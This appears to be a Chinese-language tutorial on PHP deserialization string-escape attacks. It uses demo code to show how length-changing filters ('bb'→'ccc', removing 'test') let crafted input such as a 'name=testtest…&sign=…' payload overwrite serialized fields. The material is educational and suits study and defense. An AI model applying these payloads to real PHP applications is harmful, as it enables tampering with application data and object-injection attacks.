[toc]

反序列化字符逃逸：

一共两种情况：一个是替换后导致序列化字符串变长，另一个就是替换后序列化的字符串变短。

此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞，这种题目有个共同点：

1.  php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。
2.  总是**先进行序列化**，**再进行替换修改操作**。

# 一、替换后序列化字符串变长

示例代码：

```php
<?php
function filter($str){
    return str_replace('bb', 'ccc', $str);
}
class A{
    public $name='aaaa';
    public $pass='123456';
}
$AA=new A();
echo serialize($AA);
$res=filter(serialize($AA));
echo $res;
$c=unserialize($res);
echo $c->pass;
?>
// out : O:1:"A":2:{s:4:"name";s:4:"aaaa";s:4:"pass";s:6:"123456";}
```

可以看到序列化字符串是以`;}`来结尾，假若将这个加入序列化的字符串中，就会导致序列化的字符串提前闭合结束，丢弃掉后面的内容。

```php
$a = unserialize('O:1:"A":2:{s:4:"name";s:5:"aaaa";s:4:"pass";s:6:"123456";}');
echo $a;
```

这里会出错，原因是因为他会把双引号当做字符串，而下一个是分号，没有闭合导致报错。

假如说上面的代码中`$name = 'aaaabb'`，这时会进行替换，

```php
O:1:"A":2:{s:4:"name";s:6:"aaaaccc";s:4:"pass";s:6:"123456";}
```

而再次反序列化的时候就会出错，末尾的c是读取不到的，这样就形成了一个字符串的逃逸。也就是说每多加一个bb就会逃逸一个字符。那我们将逃逸的字符串的长度填充成我们要反序列化的代码长度的话那就可以控制反序列化的结果以及类里面的变量值了。

假若在name处写一些其他的东西：

```php
<?php
function filter($str){
    return str_replace('bb', 'ccc', $str);
}
class A{
    public $name='";s:4:"pass";s:6:"hacker";}';
    public $pass='123456';
}
$AA=new A();
//echo serialize($AA);
//echo '</br>';
$res=filter(serialize($AA));
echo $res;
echo '</br>';
$c=unserialize($res);
print_r($c);

?>
out:
O:1:"A":2:{s:4:"name";s:27:"";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}
A Object ( [name] => ";s:4:"pass";s:6:"hacker";} [pass] => 123456 )
```

注意上面27的那个位置，还有就是可以看出pass仍然是123456。

这里主要是没有过滤，看下面的内容（`";s:4:"pass";s:6:"hacker";}`的长度为27）：

```php
class A{
    public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}';
    public $pass='123456';
}

out:
O:1:"A":2:{s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}

A Object ( 
	[name] => ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc 
	[pass] => hacker )
```

可以看到pass已经改为了hacker，成功逃逸。

# 二、替换之后导致序列化字符串变短

test的代码：

```php
<?php
function str_rep($string){
	return preg_replace( '/php|test/','', $string);
}

$test['name'] = $_GET['name'];
$test['sign'] = $_GET['sign']; 
$test['number'] = '2020';
$temp = str_rep(serialize($test));
printf($temp);
$fake = unserialize($temp);
echo '<br>';
print("name:".$fake['name'].'<br>');
print("sign:".$fake['sign'].'<br>');
print("number:".$fake['number'].'<br>');
?>
output:(?name=whoami&sign=hello)
a:3:{s:4:"name";s:6:"whoami";s:4:"sign";s:5:"hello";s:6:"number";s:4:"2020";}
name:whoami
sign:hello
number:2020
```

接下来使用name和sign间接修改number的值：

payload:`name=testtesttesttesttesttest&sign=hello";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}`

```php
a:3:{s:4:"name";s:24:"";s:4:"sign";s:54:"hello";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}";s:6:"number";s:4:"2020";}
name:";s:4:"sign";s:54:"hello
sign:eval
number:2000
```

将test全部替换为空，这样就导致原来正确的`";s:4:"sign";s:54:"hello`变为了name，而后面构造的恶意字符串达到了替换的效果。

